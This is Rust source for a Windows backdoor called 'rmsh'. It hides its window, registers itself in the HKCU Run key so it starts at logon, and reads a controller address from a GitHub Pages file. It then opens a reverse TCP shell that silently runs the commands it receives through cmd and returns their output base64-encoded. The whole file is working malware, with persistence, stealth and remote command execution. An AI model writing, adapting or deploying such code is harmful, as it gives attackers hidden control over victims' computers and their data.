#![windows_subsystem = "windows"]

extern crate winreg;
use reqwest::Error;
use std::{
    env,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    os::windows::process::CommandExt,
    process::Command,
    thread,
    time::Duration, path::Path,
};
use winreg::enums::*;
use winreg::RegKey;

#[cfg(target_os = "windows")]
const SHELL: [&str; 2] = ["cmd", "/c"];
#[cfg(not(target_os = "windows"))]
const SHELL: [&str; 2] = ["bash", "-c"];

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn fetch_url() -> Result<String, Error> {
    let request_url = format!("https://khaiyuanyap.github.io/rmsh/metadata/ip.txt");
    let response = reqwest::blocking::get(&request_url)?;
    let body = response.text()?;
    Ok(body)
}

fn main() {
    // Use winreg to make this app run on startup (Windows only)
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software").join("Microsoft").join("Windows").join("CurrentVersion").join("Run");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    dbg!(&disp);
    let current_path = env::current_exe().unwrap().to_str().unwrap().to_string();
    // Get the path from the 5th character onwards
    let current_path = current_path[4..].to_string();
    key.set_value("rmsh", &current_path).unwrap();

    let remote_ip = fetch_url().expect("Failed to fetch remote IP");
    loop {
        match TcpStream::connect(remote_ip.to_string()) {
            // Will change to something that can be remotely read from
            Err(_) => {
                thread::sleep(Duration::from_millis(5000));
                continue;
            }
            Ok(mut stream) => loop {
                let mut packet = BufReader::new(&mut stream);
                let mut input = vec![];

                match packet.read_until(10, &mut input) {
                    Ok(bytes) => {
                        if bytes == 0 {
                            break;
                        } else {
                            let cmd = String::from_utf8_lossy(&input[0..input.len() - 1]);

                            #[cfg(target_os = "windows")]
                            let _ = match Command::new(SHELL[0])
                                .args(&[SHELL[1], &cmd])
                                .creation_flags(CREATE_NO_WINDOW)
                                .output()
                            {
                                Ok(output) => {
                                    if cmd.starts_with("cd") {
                                        // Buggy support for directories with whitespaces, so use dir /x to get Windows short names
                                        let _ = env::set_current_dir(
                                            cmd.split_whitespace().nth(1).expect(
                                                "The system cannot find the path specified.",
                                            ),
                                        );
                                        let _ = stream.write_all(b"\n");
                                        let _ = stream.write_all(b"\n");
                                    } else {
                                        let _ = stream.write_all(
                                            (base64::encode(output.stdout) + "\n").as_bytes(),
                                        );
                                        let _ = stream.write_all(
                                            (base64::encode(output.stderr) + "\n").as_bytes(),
                                        );
                                    }
                                }
                                Err(error) => {
                                    let _ = stream.write_all((error.to_string() + "\n").as_bytes());
                                }
                            };

                            #[cfg(not(target_os = "windows"))]
                            // Low priority as most users will be on Windows
                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).output() {
                                Ok(output) => {
                                    if cmd.starts_with("cd") {
                                        let _ = env::set_current_dir(
                                            cmd.split_whitespace().nth(1).expect(
                                                "The system cannot find the path specified.",
                                            ),
                                        );
                                    }
                                    let _ = stream.write_all(
                                        (base64::encode(output.stdout) + "\n").as_bytes(),
                                    );
                                    stream.write_all(
                                        (base64::encode(output.stderr) + "\n").as_bytes(),
                                    )
                                }
                                Err(error) => {
                                    stream.write_all((error.to_string() + "\n").as_bytes())
                                }
                            };
                        }
                    }
                    Err(_) => {
                        break;
                    }
                }
            },
        }
    }
}
